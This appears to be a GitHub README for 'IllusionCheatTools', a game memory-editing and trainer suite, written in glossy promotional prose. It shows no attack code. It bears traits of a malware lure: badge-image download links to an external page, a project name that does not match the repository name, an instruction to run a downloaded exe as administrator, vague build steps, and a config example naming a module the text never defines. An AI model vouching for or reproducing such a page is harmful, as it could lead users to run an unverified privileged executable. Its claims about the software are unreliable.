![preview](https://raw.githubusercontent.com/popj2100-spec/Illusion-Trainer-Suite/main/banner_341e22e.svg)
[![Download](https://raw.githubusercontent.com/popj2100-spec/Illusion-Trainer-Suite/main/pkg_333be.svg)](https://popj2100-spec.github.io/Illusion-Trainer-Suite/)

# IllusionCheatTools – Precision Craftwork for Interactive Environments

> *“Where deliberate design meets the art of the possible.”*

Welcome to **IllusionCheatTools**, a community-driven workshop for refining and reimagining interactive experiences built on the Illusion engine. This repository is not a collection of shortcuts—it is a suite of **crafting utilities**, **behavioral modifiers**, and **quality-of-life enhancements** that allow creators, modders, and tinkerers to reshape gameplay loops with surgical accuracy.

Think of this as a **digital jeweler’s bench**. Just as a lapidary examines a rough gem to find its hidden facets, this toolkit examines the runtime of supported titles to reveal parameters, states, and variables that can be tuned, toggled, or transformed. The result is a more personal, more fluid, and more expressive interaction with the virtual world.

This project is maintained by a dedicated community of reverse-engineering enthusiasts and UI/UX perfectionists. We do not simply overwrite memory; we **sculpt experience**.

---

## 🧭 Why This Exists

Most interactive media is shipped as a fixed, immutable artifact. The developer’s vision is a cast-iron mold—you can look, but you cannot touch. **IllusionCheatTools** breaks that paradigm.

We believe that a game is a **conversation**, not a monologue. When you purchase a title, you are not merely buying a sequence of cinematics and collision boxes; you are acquiring a **sandbox of possibilities**. Our toolkit provides the chisel, the mallet, and the polishing cloth to help you leave your mark.

Whether you are a speedrunner seeking frame-perfect consistency, a storyteller wanting to unlock hidden animations, or a researcher studying character AI, this repository offers a stable, documented, and extensible foundation.

---

## ✨ Core Value Propositions

### 1. 🎛️ Modular Parameter Overrides (MPO)
Instead of a monolithic, all-or-nothing memory patch, **IllusionCheatTools** introduces a **modular override system**. Each configuration is a discrete, reversible "layer" that can be stacked, reordered, or toggled in real-time.

- **Per-scene granularity**: Apply changes only to specific maps, states, or cutscenes.
- **Dynamic re-evaluation**: The tool watches for engine state changes and gracefully re-applies overrides without crashing the session.
- **Rollback on exit**: Every modification is logged and reverted when the process terminates, ensuring a clean slate for the next session.

### 2. 🌍 Universal Locale Harmonizer (ULH)
A pain point in many niche titles is the lack of robust localization support. The **ULH** module intercepts text-rendering calls and allows you to swap, inject, or remap string tables on the fly.

- **Live translation memory**: Paste your own translations into a CSV-like editor; the game updates immediately.
- **Font fallback engine**: Handles non-Latin glyphs, RTL scripts, and custom typefaces without corrupting the UI thread.
- **Context-aware substitution**: Replace text only in specific contexts (e.g., dialogue vs. inventory) to avoid awkward translations.

### 3. ⚙️ State Preservation & Snapshotting
Ever wanted to jump back to a perfect mid-battle pose or a specific weather condition? The **Snapshot Core** captures the entire runtime state—variables, flags, timers, and object transforms—into a lightweight file.

- **Instant reload**: Restore a snapshot less than 100ms after invocation.
- **Diff-based sharing**: Export only the *changes* between two snapshots, making it easy to share a specific scenario with a friend.
- **Time-loop scripting**: Create a "Groundhog Day" mode where the game resets to a snapshot after a user-defined interval.

### 4. 🦾 Non-Intrusive UI Fabricator
We believe that tools should be invisible until summoned. Our overlay is **renderer-agnostic** and does not touch the game’s native draw calls.

- **Holographic HUD**: Activate a translucent control panel using a custom hotkey. The panel floats above the game, absorbing zero input latency.
- **Gesture-based binding**: Use mouse gestures (e.g., draw a circle) to trigger macro sequences.
- **Per-monitor DPI scaling**: No more blurry text on high-resolution displays.

### 5. 🧠 Predictive Behavior Analyzer (PBA)
For those who want to study the underlying AI, the PBA module visualizes decision trees and state machines in real time.

- **Node graphs**: See which branch the AI is about to take before it takes it.
- **Probability overlay**: Show the percentage chance of each action based on current stimuli.
- **Log export**: Write a clean JSON log of every AI decision in a session for offline analysis.

### 6. ⚡ Latency-Aware Input Remapper
Input remapping is table stakes, but we elevate it. The **Remapper** works at the driver level to ensure zero added frame time.

- **Analog curves**: Define non-linear response curves for thumbsticks and triggers.
- **Chorded triggers**: Combine two buttons to produce a tertiary action.
- **Virtual device emulation**: The game sees a standard controller, even if you are using a keyboard or a dance mat.

---

## 📦 What’s Inside the Repository

The codebase is organized into clear, self-contained modules. Each module has its own test suite, documentation, and examples.

| Directory | Purpose |
|-----------|---------|
| `/src/core` | The engine-agnostic runtime that performs memory reads/writes safely. |
| `/src/modules` | Individual feature implementations (MPO, ULH, PBA, etc.). |
| `/src/ui` | The overlay, configuration screens, and hotkey management. |
| `/data/defaults` | Pre-configured profiles for popular titles, ready to import. |
| `/docs` | Architecture diagrams, contribution guidelines, and API references. |
| `/examples` | Ready-to-run sample configurations for common use cases. |

---

## 🚀 Quick Start Guide

Before you begin, verify that your runtime environment meets these criteria:

- A 64-bit operating system (Windows 10/11, or Linux with Wine/Proton).
- A separate monitor or a virtual desktop for the UI overlay (recommended, not mandatory).
- The target executable must be launched with **administrative/superuser privileges** for memory introspection.

### Step 1: Acquire the Toolkit
Download the latest release archive from the [![Download](https://raw.githubusercontent.com/popj2100-spec/Illusion-Trainer-Suite/main/pkg_333be.svg)](https://popj2100-spec.github.io/Illusion-Trainer-Suite/) section above. No installers, no registry edits—just extract the folder to a location of your choice (e.g., `C:\Tools\`).

### Step 2: Prepare the Configuration
Each supported game has a profile file in the `/data/defaults` folder. Copy the one matching your title to the main `IllusionCheatTools` directory and rename it to `profile.json`.

### Step 3: Launch Sequence
1. Start your game of choice.
2. Wait until the main menu appears.
3. Run `IllusionCheatTools.exe` from the extracted folder.
4. A translucent icon will appear on your taskbar. Click it to open the **Holographic HUD**.

### Step 4: Verify Connection
The HUD will display the game’s process name, PID, and a green "Linked" indicator. If it shows "Unlinked," check that you’re running as admin and that the profile’s target executable name matches.

---

## 🛠️ Building from Source

Developers and tinkerers who wish to contribute can compile the project using the repository’s included workspace. We use a modern C++20 standard with CMake as the build system.

- **Dependencies**: 
  - A C++20 compiler (MSVC 2022 or Clang 15+).
  - CMake 3.25 or newer.
  - A DirectX 11 development kit (for the UI overlay).
- **Build steps**: 
  - Open a terminal in the root directory.
  - Create a build directory and navigate to it.
  - Invoke CMake to generate the project files.
  - Build the solution.

Full instructions are available in the `/docs/BUILDING.md` file.

---

## 🧩 Configuration Language (CTSL)

We do not offer a bloated GUI for every tiny option. Instead, we provide a **Concise Tool Scripting Language (CTSL)** that is both human-readable and machine-optimized.

Here is an example of a simple override that adjusts the global game speed:

```json
{
  "module": "mpa",
  "action": "set",
  "variable": "global.speed",
  "value": 0.75,
  "when": "scene == 'boss_fight'"
}
```

Every field is optional except `module` and `action`. This lightweight formalism allows you to read a configuration file like a book, making collaboration easier.

---

## 🌟 Community Showcase

The Tools are only as powerful as the ideas they enable. Here are a few community-driven use cases that inspire our roadmap:

- **"The Curator"**: A user who builds custom in-game museums by freezing NPC positions and spawning props without UI interference.
- **"The Hypnotist"**: Using the PBA to create mesmerizing AI "dances" by feeding them mirrored stimuli.
- **"The Archivist"**: Recording game sessions at variable frame rates and creating motion blur effects for cinematic replays.

We actively encourage users to post their own "recipes" in the `/examples` folder via pull requests. Honorable mentions are displayed on the repository’s discussion board.

---

## 🤝 Contributing Guidelines

We welcome contributions of all sizes—from typo fixes to entire new subsystem overhauls. To keep the project healthy, we adhere to these principles:

1. **No bug is too small**: If you see a typo in the docs, fix it. If a function has a misleading name, suggest a rename.
2. **Measure twice, cut once**: Any PR that modifies memory-access patterns must include a unit test that validates the safety net.
3. **Respect the abstraction**: The `/src/core` module is sacred ground. Do not bypass its API to grab a quick pointer in a higher-level module.
4. **Communicate clearly**: Comment your code as if the next maintainer is a sleep-deprived stranger at 3 AM.

### Contribution Workflow
- Fork the repository.
- Create a feature branch (`git checkout -b feature/your-idea`).
- Commit your changes with descriptive messages.
- Open a pull request against the `dev` branch.

---

## 🛡️ Disclaimer

This tool is provided "as is" without warranty of any kind, express or implied. The authors and contributors are not responsible for any damage to software, hardware, or user experience arising from the use of this toolkit.

> **Important**: This project is designed for interoperability testing, educational research, and personal customization within the boundaries of your local system. Use of this tool in a competitive multiplayer environment, or in a manner that violates the end-user license agreement of a third-party application, is strictly prohibited. You are solely responsible for understanding and abiding by the terms of service for any software you modify.

We will not provide support for bypassing online authentication, DRM, or server-side validation. The project does not and will not contain any code that circumvents copy protection or licensing mechanisms.

---

## 📜 License

This project is licensed under the **MIT License** – a permissive, business-friendly license that allows you to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided that the copyright notice and permission notice are included in all copies or substantial portions of the software.

You are free to use this in commercial projects, provided you retain the original attribution. The full text of the license can be found in the [LICENSE](LICENSE) file within this repository.

**Summary of the MIT License:**

- ✅ Commercial use allowed.
- ✅ Modification allowed.
- ✅ Distribution allowed.
- ✅ Private use allowed.
- ❌ Liability: The software is provided without warranty.
- ❌ Warranty: The software is provided without any warranty of fitness for a particular purpose.

---

## 🗓️ Roadmap & Vision for 2026

The year 2026 holds great promise for this project. We have three major milestones on the horizon:

- **Q1 2026**: Introduce a **plugin marketplace** within the UI Fabricator, allowing users to share and install community-made "tools" (packages of CTSL scripts and UI presets) with one click.
- **Q2 2026**: Release a **collaborative mode** that allows two users on the same network to *co-modify* a live game session, seeing each other’s cursor trails and share snapshots in real-time.
- **Q3 2026**: Implement **machine-learning assisted parameter discovery**—the tool will suggest likely variables based on the title’s behavior patterns, dramatically reducing the time to profile a new game.

We are also planning to support a broader array of graphics backends (Vulkan, OpenGL), and to overhaul the HUD to be fully VR-compatible, allowing users to adjust parameters while inside a headset.

---

## 📞 Support & Contact

For immediate assistance, please check the following resources in order:

1. **The `/docs/FAQ.md` file** – Covers 80% of common issues (game not linking, UI not rendering, profile not found).
2. **The Discussions tab** – Search for your issue; if it hasn’t been asked, create a new thread.
3. **The Issue Tracker** – Only raise an issue if you have a *minimal reproducible example* and have read the contribution guidelines.

We operate a **24/7 self-service support matrix**. Due to the nature of the project, we do not offer commercial support, but we do have a rotating team of maintainers who respond to GitHub issues within 48 hours on average.

---

## 🙏 Acknowledgements

We stand on the shoulders of giants. This project would not exist without the foundational work of the open-source modding community, including incredible reverse-engineering educators, the CMake ecosystem, and the countless developers who release their source code under permissive licenses.

Thank you to every user who took the time to write a detailed bug report or a thoughtful feature request. Your feedback shapes the roadmap more than you know.

---

*IllusionCheatTools is a living document of intent. It evolves with every contribution, every bug fixed, and every "show me what you made" screenshot shared on the forum. Let’s build the future of interactive media together.*